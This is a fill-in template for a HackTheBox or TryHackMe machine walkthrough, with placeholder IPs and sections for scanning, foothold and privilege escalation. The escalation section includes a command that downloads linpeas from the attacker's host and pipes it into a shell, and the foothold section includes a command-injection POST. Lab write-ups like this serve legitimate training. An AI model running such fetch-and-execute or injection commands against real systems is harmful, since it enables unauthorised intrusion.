---
title: "MachineName - HackTheBox / TryHackMe Walkthrough"
description: "Complete walkthrough of MachineName on HackTheBox covering enumeration, initial foothold, and privilege escalation."
pubDate: "YYYY-MM-DD"
author: "MrR0807"
categories: ["HackTheBox", "CTF"] # or TryHackMe
tags: ["htb", "linux", "privesc", "cve"]
pin: false
---

# Machine Overview

- **OS**: Linux / Windows
- **Difficulty**: Medium
- **Platform**: HackTheBox
- **IP Address**: `10.10.11.XXX`

---

## 1. Reconnaissance & Port Scanning

```bash
# Initial Nmap quick scan
nmap -sC -sV -oN nmap/initial 10.10.11.XXX
```

### Scan Findings:
- Port `22/tcp` - OpenSSH
- Port `80/tcp` - HTTP Web Server

---

## 2. Initial Foothold

```bash
# Exploit commands / payload delivery
curl -X POST http://10.10.11.XXX/exploit -d "cmd=id"
```

---

## 3. Privilege Escalation

```bash
# Automated enumeration with linpeas
curl -L http://10.10.14.X:8000/linpeas.sh | sh
```

### Root Exploitation:

```bash
sudo -u root /usr/bin/vulnerable-binary
```

---

## Key Takeaways

1. Vulnerability classification and lesson learned.
2. Defense-in-depth prevention advice.
